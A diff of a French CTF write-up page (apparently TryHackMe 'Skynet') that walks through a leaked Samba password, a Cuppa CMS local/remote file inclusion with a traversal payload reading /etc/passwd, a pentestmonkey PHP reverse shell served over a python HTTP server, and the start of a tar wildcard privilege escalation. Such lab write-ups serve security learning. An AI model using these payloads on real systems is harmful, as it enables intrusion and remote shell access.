@@ -221,8 +221,7 @@
 </code></pre></div></div>
 <p>On accède ainsi à la boîte mail de Miles Dyson. En consultant ses mails on tombe sur celui à propos de la réinitialisation de son mot de passe Samba</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>We have changed your smb password after system malfunction.
-Password: )s{A&amp;2Z=F^n_E.B`
-</code></pre></div></div>
+Password: )s{A&amp;2Z=F^n_E.B`</code></pre></div></div>
 <p>On peut alors se connecter au partage milesdyson qui nous demandais un mot de passe</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smbclient //skynet.thm/milesdyson -U milesdyson </span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Password for [WORKGROUP\milesdyson]:</span>
@@ -325,16 +324,14 @@ Password: )s{A&amp;2Z=F^n_E.B`
 <h2 id="obtention-du-shell">Obtention du shell</h2>
 <p>Cuppa CMS est vulnérable à une LFI et une RFI. En effet dans son code source, le fichier 
 <code>/alerts/alertConfigField.php</code>  on trouve à la ligne 22</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">php</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-php">&lt;?php include($_REQUEST["urlConfig"]); ?&gt;
-</code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">php</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-php">&lt;?php include($_REQUEST["urlConfig"]); ?&gt;</code></pre></div></div>
 <ul>
 <li>$_REQUEST["urlConfig"] récupère n’importe quelle donnée envoyée par l’utilisateur via l’URL ou le formulaire</li>
 <li>include()  prend un fichier et l’éxecute comme code</li>
 </ul>
 <p>Ainsi l’attaquant détourne l’utilisation prévue du paramètre pour lire un fichier qu’il ne devait pas voire  et peut lire un fichier interne du serveur (LFI). Pire si la configuration PHP(allow_include) le permet l’utilisateur peut inclure un fichier stocké sur un serveur distant(RFI)</p>
 <p>Vérifions maintenant la présence de la vulnérabilité.</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-</code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></pre></div></div>
 <p>On as accès au contenu entier du fichier. La cible est donc vulnérable. On peut donc essayer d’exploiter le RFI pour obtenir un shell. Sur notre machine on cré un fichier shell.php qui contient le script de notre reverse shell de pentester monkey</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">php</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-php">&lt;?php
 // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
@@ -451,8 +448,7 @@ function printit ($string) {
     }
 }
 
-?&gt;
-</code></pre></div></div>
+?&gt;</code></pre></div></div>
 <p>On va ensuite lancer un serveur python sur notre machine</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">python3 -m http.server 8000</span>
 </code></pre></div></div>
@@ -536,8 +532,7 @@ function printit ($string) {
 <p>En effet, quand on utilise * le shell se charge de remplacer ça par la liste des fichiers. Par exemple si dans notre dossier on a </p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>abc
 acd
-shell
-</code></pre></div></div>
+shell</code></pre></div></div>
 <p>Et on tape </p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">tar *</span>
 </code></pre></div></div>
